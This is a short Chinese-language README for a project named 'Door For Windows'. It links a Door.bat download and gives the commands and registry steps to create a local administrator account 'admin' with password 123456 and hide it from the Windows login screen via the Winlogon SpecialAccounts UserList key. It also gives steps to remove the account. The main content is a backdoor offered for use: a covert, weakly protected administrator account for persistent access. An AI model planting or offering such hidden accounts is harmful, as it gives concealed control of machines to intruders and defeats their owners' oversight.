## Door For Windows

https://github.com/dylanbai8/door_for_windows/releases/download/v2/Door.bat

## ▚ 设置

添加用户
```
管理员权限运行 cmd 打开命令行

net user admin 123456 /add
net localgroup administrators admin /add
```

隐藏用户
```
使用 win+r regedit 打开注册表
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon

依次添加：
SpecialAccounts
UserList

得到：
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList

右侧-右键-新建-DWORD(32位)值-填写用户名 admin
```

## ▚ 删除

删除用户
```
管理员权限运行 cmd 打开命令行
net user admin /del

使用 win+r regedit 打开注册表

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
删除 SpecialAccounts

[以下两项新用户登陆过才会有]

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList
找到对应用户项-删除

打开资源管理器
C:\Users 删除对应我用户文件夹
```

